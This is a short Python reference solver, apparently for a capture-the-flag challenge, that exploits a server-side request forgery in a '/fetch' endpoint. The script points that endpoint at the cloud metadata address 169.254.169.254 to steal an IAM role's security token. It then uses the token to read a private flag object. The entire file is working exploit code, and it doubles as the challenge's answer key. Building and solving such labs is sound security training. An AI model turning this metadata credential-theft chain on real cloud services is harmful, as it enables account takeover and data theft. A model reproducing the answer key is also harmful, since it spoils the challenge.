#!/usr/bin/env python3
"""Reference solver for cloud-backup-imds (SSRF -> IMDS -> role -> private object).

    python3 solve.py http://HOST:PORT
"""
import json
import sys
import urllib.parse
import urllib.request

IMDS = "http://169.254.169.254/latest/meta-data/iam/security-credentials/backup-role"


def solve(base):
    base = base.rstrip("/")
    # SSRF: the fetcher does not block the metadata address.
    creds_url = base + "/fetch?" + urllib.parse.urlencode({"url": IMDS})
    creds = json.loads(urllib.request.urlopen(creds_url, timeout=10).read())
    token = creds["Token"]
    # Use the role token to read the private flag object.
    req = urllib.request.Request(
        base + "/objects/flag", headers={"X-Role-Token": token}
    )
    return json.loads(urllib.request.urlopen(req, timeout=10).read())["flag"]


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit("usage: solve.py http://HOST:PORT")
    print(solve(sys.argv[1]))
